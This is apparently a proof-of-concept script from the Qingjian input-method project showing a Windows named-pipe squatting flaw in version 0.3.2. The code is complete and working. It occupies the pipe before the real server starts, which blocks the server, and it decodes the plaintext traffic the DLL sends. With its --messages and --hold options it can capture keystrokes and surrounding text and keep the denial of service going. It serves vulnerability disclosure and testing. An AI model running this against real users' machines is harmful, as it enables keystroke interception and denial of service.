#!/usr/bin/env python3
"""青简 0.3.2（Windows）命名管道抢注 —— 只读 PoC。

`qingjian-server.exe` 不是开机自启的：DLL 在用户第一次用青简打字时才用 `ShellExecuteW` 把它拉起来
（`tsf/src/com/service/launch.rs`），而它在 `\\\\.\\pipe\\qingjian` 上建实例时带
`FILE_FLAG_FIRST_PIPE_INSTANCE`——**已经有人占了这个名字，它就建不出来、直接退出**
（`ipc/pipe.rs` 的 `serve_pipe`）。而 DLL 连管道时也不校验对端是谁（`tsf/src/client/pipe.rs`）。

于是：本机任意进程（不需要管理员）只要在用户打字之前把这个名字占上，就同时拿到

  1. 拒绝服务：真的 Server 起不来，输入法只能出英文（好一点的宿主会切回上一个输入法）；
  2. 输入旁路：DLL 把 `OpenSession{app}`、`Key{event}`、`Surrounding{text}`（光标前 64 字）
     全发到这个假 Server 上——**明文，没有任何鉴别**。回包还能让任意文本落进任意 TSF 应用。

本脚本只占位并打印收到的第一条消息（`OpenSession` 里的宿主应用名），不构造回包、不写文档，
读完就退出、把名字让出来，避免把用户的应用卡在 `open()` 上。

用法（普通用户权限，Windows）：

    python tools/poc/pipe-squat.py                 # 占位，等第一条连接，打印后退出
    python tools/poc/pipe-squat.py --hold 30       # 占位 30 秒不让真 Server 起来（演示 DoS）

演示步骤：先确保青简没在跑（任务管理器结束 qingjian-server.exe），占位，然后随便找个能打字的
地方切成青简敲一个键——真 Server 拉不起来，脚本这边就会打印出宿主应用名。
"""

from __future__ import annotations

import argparse
import ctypes
import ctypes.wintypes as wintypes
import json
import msvcrt
import os
import struct
import sys
import time

from pipe_name import default_pipe_name

PIPE_ACCESS_DUPLEX = 0x00000003
PIPE_TYPE_BYTE = 0x00000000
PIPE_READMODE_BYTE = 0x00000000
PIPE_WAIT = 0x00000000
PIPE_UNLIMITED_INSTANCES = 255
INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value
ERROR_PIPE_CONNECTED = 535

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)


def create_instance(name: str) -> int:
    """建一个实例。不带 `FILE_FLAG_FIRST_PIPE_INSTANCE`，所以名字空着就能占上。"""
    handle = kernel32.CreateNamedPipeW(
        ctypes.c_wchar_p(name),
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        65536,
        65536,
        0,
        None,
    )
    if handle in (None, INVALID_HANDLE_VALUE):
        raise OSError(ctypes.get_last_error(), "CreateNamedPipeW 失败")
    return handle


def wait_client(handle: int) -> None:
    if not kernel32.ConnectNamedPipe(wintypes.HANDLE(handle), None):
        error = ctypes.get_last_error()
        if error != ERROR_PIPE_CONNECTED:
            raise OSError(error, "ConnectNamedPipe 失败")


def handle_to_fd(handle: int) -> int:
    return msvcrt.open_osfhandle(handle, os.O_RDWR | os.O_BINARY)


def read_frame(fd: int) -> dict:
    """4 字节小端长度 + JSON，与 `protocol/codec.rs` 一致。"""
    header = b""
    while len(header) < 4:
        chunk = os.read(fd, 4 - len(header))
        if not chunk:
            raise EOFError("客户端断开")
        header += chunk
    (size,) = struct.unpack("<I", header)
    body = b""
    while len(body) < size:
        chunk = os.read(fd, size - len(body))
        if not chunk:
            raise EOFError("客户端断开")
        body += chunk
    return json.loads(body)


def describe(message: dict) -> str:
    """一条 ClientMessage 的人话版本；只有 `OpenSession` 与 `Key` 值得看。"""
    (kind, payload), = message.items()
    if kind == "OpenSession":
        return f"OpenSession  会话 {payload.get('session')}，宿主应用 {payload.get('app')!r}，协议 v{payload.get('protocol')}"
    if kind == "Key":
        event = payload.get("event") or {}
        return (
            f"Key          会话 {payload.get('session')}，"
            f"虚拟键 {event.get('virtual_key')} 字符 {event.get('character')!r}"
        )
    if kind == "Surrounding":
        return f"Surrounding  会话 {payload.get('session')}，光标前文 {payload.get('text')!r}"
    return f"{kind}  会话 {payload.get('session')}"


def main() -> int:
    parser = argparse.ArgumentParser(description="青简命名管道抢注 PoC（只读）")
    parser.add_argument("--pipe", help="管道名（缺省按当前用户的 SID 派生）")
    parser.add_argument("--hold", type=float, default=0.0, help="占位多少秒后退出（0 = 收到一条就退出）")
    parser.add_argument("--messages", type=int, default=1, help="最多打印几条消息")
    args = parser.parse_args()

    if os.name != "nt":
        print("这个 PoC 只对 Windows 的命名管道有效", file=sys.stderr)
        return 1

    args.pipe = args.pipe or default_pipe_name()

    handle = create_instance(args.pipe)
    print(f"已占用 {args.pipe}：真的 qingjian-server.exe 现在起不来（它用 FILE_FLAG_FIRST_PIPE_INSTANCE）")
    print("现在去随便一个能打字的地方切成青简、敲一个键。\n")

    deadline = time.monotonic() + args.hold if args.hold > 0 else None
    fd = handle_to_fd(handle)
    try:
        wait_client(handle)
        print("有客户端连上来了：")
        for _ in range(args.messages):
            if deadline and time.monotonic() > deadline:
                break
            print("  " + describe(read_frame(fd)))
    except (EOFError, OSError) as error:
        print(f"（连接结束：{error}）")
    finally:
        if deadline and deadline > time.monotonic():
            # 名字还占着（关掉 fd 才释放），趁这段时间看真 Server 拉不拉得起来。
            remaining = deadline - time.monotonic()
            print(f"占着名字 {remaining:.0f}s，这段时间真的 Server 起不来…")
            time.sleep(remaining)
        os.close(fd)
    print("\n已释放管道名。")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
